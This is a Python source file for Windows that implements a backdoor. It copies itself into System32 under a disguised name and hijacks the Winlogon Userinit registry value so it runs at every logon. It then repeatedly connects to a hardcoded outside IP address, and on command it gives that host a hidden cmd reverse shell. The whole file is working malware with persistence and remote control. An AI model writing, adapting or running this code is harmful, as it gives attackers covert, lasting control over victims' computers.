import socket
import time
import subprocess
import threading
import os
import winreg
import shutil
import sys

def setup():
    if os.path.exists('C:\\Windows\\System32\\WindowsHelpProvider.exe') == False:
        shutil.copy(sys.executable, 'C:\\Windows\\System32\\WindowsHelpProvider.exe')

    def userinit_present():
        try:
            reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon', 0, winreg.KEY_READ)
            userinit_value, reg_type = winreg.QueryValueEx(reg_key, 'Userinit')
            if 'c:\\windows\\system32\\userinit.exe' in userinit_value.lower():
                return True
            return False
        except FileNotFoundError:
            return False
        except Exception as e:
            print(f'An error occurred: {e}')
            return False
    if userinit_present():
        reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon', 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, 'Userinit', 0, winreg.REG_SZ, 'C:\\Windows\\System32\\WindowsHelpProvider.exe')
        winreg.CloseKey(reg_key)
    else:
        os.system('start C:\\Windows\\System32\\userinit.exe')
        os.system('taskkill /F /IM explorer.exe & start explorer.exe')

def send_msg(s, message):
    s.send(message)

def recive_message(s):
    msg = s.recv(1024)
    return msg

def connect():
    try:
        s.connect((host, port))
        main_communication()
        print('COMMUNICATION ENDED')
    except Exception as e:
        print(str(e))
        print('Failed Connection, Trying Again')
        time.sleep(5)

def shell(sock):
    shell_active = True

    def socket_to_process(sock, process):
        while True:
            if shell_active:
                data = sock.recv(1024)
                if data:
                    if shell_active:
                        process.stdin.write(data)
                        process.stdin.flush()
                    else:
                        return None
            else:
                break

    def process_to_socket(sock, process):
        while True:
            if shell_active:
                sock.send(process.stdout.read(1))
            else:
                break
    process = subprocess.Popen(['cmd'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, creationflags=134217728)
    threading.Thread(target=socket_to_process, args=(sock, process), daemon=True).start()
    threading.Thread(target=process_to_socket, args=(sock, process), daemon=True).start()
    try:
        process.wait()
        shell_active = False
        sock.send(b'<SHELL_COMMUNIC_OB_ATION_ENDED>')
        process.kill()
        print('DONE')
    except KeyboardInterrupt:
        return None

def main_communication():
    while True:
        cmd = recive_message(s=s).decode()
        if cmd == '<SERVER_EXIT>':
            print(cmd)
            s.close()
            return
        if cmd == '<PING>':
            pass
        if cmd == 'shell':
            shell(sock=s)
if __name__ == '__main__':
    host = '130.61.214.204'
    port = 25585
    setup()
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect()